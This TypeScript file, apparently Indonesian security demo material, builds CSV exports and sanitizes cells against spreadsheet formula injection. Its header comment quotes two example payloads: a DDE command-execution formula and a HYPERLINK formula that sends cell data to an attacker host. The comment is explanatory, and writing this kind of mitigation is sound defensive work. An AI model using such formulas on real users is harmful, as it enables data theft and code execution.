// ===================================================================
// Utilitas Pembuatan CSV & Mitigasi Formula Injection (src/lib/csv.ts)
//
// ALASAN KEAMANAN (Materi Demo Cyber Security):
// 1. Serangan CSV / Formula Injection (CWE-1236):
//    Ketika data diekspor ke format CSV dan dibuka di program spreadsheet (Excel/Calc),
//    sel yang diawali oleh karakter formula seperti '=', '+', '-', atau '@'
//    dapat dieksekusi secara otomatis oleh aplikasi spreadsheet.
//    Penyerang bisa menyusupkan formula berbahaya, misalnya:
//    `=cmd|'/C calc'!A0` (Eksekusi program) atau `=HYPERLINK("http://attacker.com/steal?data="&A2)`
// 2. Mitigasi Standar OWASP:
//    Setiap sel teks yang diawali karakter [=, +, -, @, \t, \r] wajib diawali
//    dengan tanda petik tunggal (') di bagian depan. Karakter petik tunggal ini
//    memerintahkan Excel memperlakukan sel sebagai teks harfiah (plain text)
//    dan membatalkan kalkulasi formula.
// 3. Standar Format RFC 4180:
//    Setiap nilai diapit tanda kutip ganda dan karakter kutip di dalam data
//    di-escape menjadi dua kutip ganda ("").
// ===================================================================

/**
 * Mensterilkan nilai teks agar aman dari CSV Formula Injection
 * @param value Nilai teks yang akan dimasukkan ke dalam sel CSV
 * @returns String yang telah disanitasi dan di-escape sesuai standar RFC 4180
 */
export function sanitizeCsvCell(value: unknown): string {
  if (value === null || value === undefined) {
    return '""';
  }

  let text = String(value).trim();

  // MITIGASI FORMULA INJECTION (CWE-1236):
  // Periksa apakah teks diawali dengan karakter pemicu formula spreadsheet
  const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];
  if (FORMULA_TRIGGERS.some((trigger) => text.startsWith(trigger))) {
    // Sisipkan tanda petik tunggal (') di awal agar spreadsheet membaca sebagai teks statis
    text = `'${text}`;
  }

  // Escape tanda kutip ganda menjadi dua tanda kutip (" -> "") sesuai standar RFC 4180
  const escapedText = text.replace(/"/g, '""');

  return `"${escapedText}"`;
}

/**
 * Memformat larik baris menjadi string dokumen CSV dengan encoding UTF-8 BOM
 * (BOM / Byte Order Mark \uFEFF memastikan karakter aksen & Unicode terbaca sempurna di Excel)
 */
export function buildCsvDocument(headers: string[], rows: (string | number | null | undefined)[][]): string {
  const headerLine = headers.map((h) => sanitizeCsvCell(h)).join(",");
  const dataLines = rows.map((row) => row.map((cell) => sanitizeCsvCell(cell)).join(","));

  // \uFEFF adalah UTF-8 BOM untuk kompatibilitas Microsoft Excel Windows
  return "\uFEFF" + [headerLine, ...dataLines].join("\r\n");
}
